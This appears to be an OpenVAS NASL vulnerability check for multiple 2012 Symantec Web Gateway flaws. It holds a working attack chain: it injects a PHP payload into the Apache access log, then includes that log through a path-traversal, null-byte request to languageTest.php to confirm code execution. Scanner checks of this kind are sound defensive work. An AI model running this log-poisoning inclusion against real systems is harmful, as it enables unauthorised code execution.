##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_mult_vuln.nasl 6022 2017-04-25 12:51:04Z teissa $
#
# Symantec Web Gateway Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary code in
  the context of the application, bypass certain security restrictions and
  conduct SQL injection attacks.
  Impact Level: System/Application";
tag_affected = "Symantec Web Gateway versions 5.0.x before 5.0.3.18";
tag_insight = "- The application improperly validates certain input to multiple scripts via
    the management console and can be exploited to inject arbitrary shell
    commands.
  - An error within the authentication mechanism of the application can be
    exploited to bypass the authentication by modification of certain local
    files.
  - Certain unspecified input passed to the management console is not properly
    sanitised before being used in a SQL query. This can be exploited to
    manipulate SQL queries by injecting arbitrary SQL code.
  - The application improperly validates certain input via the management
    console and can be exploited to change the password of an arbitrary user
    of the application.";
tag_solution = "Upgrade to Symantec Web Gateway version 5.0.3.18 or later,
  For updates refer to http://www.symantec.com/business/web-gateway";
tag_summary = "This host is running Symantec Web Gateway and is prone to multiple
  vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802661";
CPE = "cpe:/a:symantec:web_gateway";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6022 $");
  script_bugtraq_id(54426, 54429, 54424, 54425, 54427, 54430);
  script_cve_id("CVE-2012-2953", "CVE-2012-2957", "CVE-2012-2574", "CVE-2012-2961",
                "CVE-2012-2976", "CVE-2012-2977");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-04-25 14:51:04 +0200 (Tue, 25 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-07-24 15:15:15 +0530 (Tue, 24 Jul 2012)");
  script_name("Symantec Web Gateway Multiple Vulnerabilities");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("symantec_web_gateway/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50031");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20038");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20044");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20064");
  script_xref(name : "URL" , value : "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20120720_00");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");

## Variable Initialization
dir = "";
url = "";
port = 0;

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Symantec Web Gateway Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)) {
  exit(0);
}

## Construct attack request
exploit= 'GET ' + dir + '/<?php phpinfo();?> HTTP/1.1\r\n\r\n';
res = http_send_recv(port: port, data: exploit);

## Try to access log file
url = dir + "/spywall/languageTest.php?&language=../../../../../../../../" +
            "usr/local/apache2/logs/access_log%00";
req = http_get(item: url, port:port);
res = http_send_recv(port:port, data:req);

## Confirm exploit worked by checking the log file
if(res && res =~ "HTTP/1.. 200" && "<title>phpinfo()" >< res &&
   ">Symantec Web Gateway<" >< res)
{
  security_message(port);
  exit(0);
}
